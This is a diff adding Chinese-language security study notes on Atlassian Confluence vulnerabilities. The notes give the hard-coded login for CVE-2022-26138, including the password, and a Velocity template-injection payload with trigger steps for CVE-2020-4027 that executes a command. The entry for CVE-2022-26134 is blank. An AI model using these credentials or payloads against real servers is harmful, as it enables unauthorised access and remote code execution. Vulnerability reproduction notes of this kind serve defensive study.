@@ -995,6 +995,74 @@ php识别成功，shell.php，php处理
 
 ## web应用漏洞
 
+#### Confluence
+
+- Atlassian Confluence Server是澳大利亚Atlassian公司的一套具有企业知识管理功能，并支持用于构建企业WiKi的协同软件的[服务器](https://cloud.tencent.com/product/cvm?from=10680)版本。
+    - ![image-20221105172531269](./web中间件漏洞.assets/image-20221105172531269.png)
+
+##### CVE-2022-26138—Confluence Server硬编码漏洞
+
+> https://cloud.tencent.com/developer/article/2134974
+
+- 漏洞影响版本
+
+    - ```
+        Questions for Confluence app == 2.7.34
+        
+        Questions for Confluence app == 2.7.35
+        
+        Questions for Confluence app == 3.0.2
+        ```
+
+- 当Confluence Server或Data Center上的**Questions for Confluence app**(一个插件)启用时，它会创建一个名为disabledsystemuser的Confluence用户帐户。内置了一个硬编码用户而且这个用户还能直接登陆 。
+
+- 然后官网上 [Questions for Confluence - Version history | Atlas...](https://marketplace.atlassian.com/apps/1211644/questions-for-confluence/version-history) 下其实是找不到密码的 ，不过 atlassian 官方有对外公开的 maven仓库。所以可以直接去比如 [Index of maven-atlassian-external/com/atlassian/co...](https://packages.atlassian.com/maven-atlassian-external/com/atlassian/confluence/plugins/confluence-questions/3.0.2/) 下下来后自己逆向下就出来了
+
+    - ```
+        User: disabledsystemuser
+        Username: disabledsystemuser
+        密码：disabled1system1user6708
+        Email: dontdeletethisuser@email.com
+        ```
+
+    - ![image-20221105172726689](./web中间件漏洞.assets/image-20221105172726689.png)
+
+##### CVE-2022-26134—Confluence EL Injection via OGNL
+
+- 
+
+##### CVE-2020-4027 Confluence SSTI via Velocity— post-auth RC
+
+**漏洞情况**
+
+- 漏洞条件:  **需要管理员权限** 
+- 漏洞触发: custom user macros 业务功能点 
+- 漏洞利用:
+    -  bypass mitigations 需要绕过沙箱后利用 
+    - 漏洞本质 velocity 引擎的问题 
+- 梳理信息: 
+    - Confluence 后台有可自定义 marco 的应用功能 
+    - 基于模板引擎 Velocity 实现 
+    - Velocity 的缓解措施可被绕过
+
+漏洞复现
+
+- 登录后台后, 在Manage apps > User Macros > Create a User Macro > Template >Definition of User Macro处插入 payload
+
+- ```
+    
+    ${req.getServletContext().getAttribute('org.apache.tomcat.InstanceManager').new
+    Instance('javax.script.ScriptEngineManager').getEngineByName('js').eval("java.l
+    ang.Runtime.getRuntime().exec('calc')")}
+    
+    ```
+
+- ![image-20221105174348647](./web中间件漏洞.assets/image-20221105174348647.png)
+
+
+
+- 保存后返回主页 单击 C 键, 创建 page, 引用上一步自定义的 User Macro , 预览即可触发
+
 ## OA产品漏洞
 
 > 办公自动化（Office Automation，简称OA），是将计算机、通信等现代化技术运用到传统办公方式，进而形成的一种新型办公方式。办公自动化利用现代化设备和信息化技术，代替办公人员传统的部分手动或重复性业务活动，优质而高效地处理办公事务和业务信息，实现对信息资源的高效利用，进而达到提高生产率、辅助决策的目的，最大限度地提高工作效率和质量、改善工作环境。
